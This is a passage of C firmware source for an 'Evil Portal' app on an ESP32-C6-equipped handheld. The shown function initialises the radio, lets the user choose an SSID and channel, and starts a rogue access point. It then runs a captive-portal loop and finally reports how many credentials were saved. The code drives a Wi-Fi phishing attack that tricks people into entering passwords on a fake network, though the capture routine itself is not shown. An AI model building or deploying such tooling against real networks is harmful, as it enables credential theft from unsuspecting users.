        strncpy(s_ep_ssid, EP_SSID_DEFAULT, EP_SSID_MAX_LEN);
    if (s_ep_channel == 0)
        s_ep_channel = EP_CHANNEL_DEFAULT;

    /* Make sure the ESP32 driver layer is up. */
    if (!m1_esp32_get_init_status())
        m1_esp32_init();
    if (!get_esp32_main_init_status())
    {
        ep_display_msg("Initializing", "ESP32-C6...");
        esp32_main_init();
    }
    if (!get_esp32_main_init_status())
    {
        ep_display_msg("ESP32", "not ready!");
        osDelay(2000);
        return;
    }

    if (!ep_select_ssid()) return;
    if (!ep_select_channel())
    {
        /* User cancelled - return to caller. */
        return;
    }

    ep_display_msg("Starting AP...", s_ep_ssid);

    if (!ep_start_ap())
    {
        ep_display_msg("AP start", "FAILED");
        osDelay(2000);
        ep_stop_ap();
        return;
    }

    ep_run_loop();

    ep_stop_ap();

    {
        char summary[24];
        snprintf(summary, sizeof(summary), "%u creds saved",
                 (unsigned)s_ep_total_creds);
        ep_display_msg("Portal stopped", summary);
        osDelay(1500);
    }
    xQueueReset(main_q_hdl);
}

#endif /* M1_APP_EVIL_PORTAL_ENABLE */
